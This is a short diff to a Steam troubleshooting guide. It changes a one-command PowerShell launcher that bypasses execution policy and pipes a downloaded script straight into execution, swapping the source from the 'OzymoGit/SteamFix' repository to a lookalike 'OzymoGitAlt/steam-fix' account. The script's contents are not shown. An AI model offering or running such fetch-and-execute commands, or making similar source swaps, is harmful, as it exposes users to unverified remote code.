@@ -151,7 +151,7 @@ This guide helps troubleshoot connectivity and execution issues when using Steam
   ```
   Or run via one-command launcher:
   ```powershell
-  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/OzymoGit/SteamFix/main/SteamFix.ps1' | iex"
+  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/OzymoGitAlt/steam-fix/main/SteamFix.ps1' | iex"
   ```
 
 ---
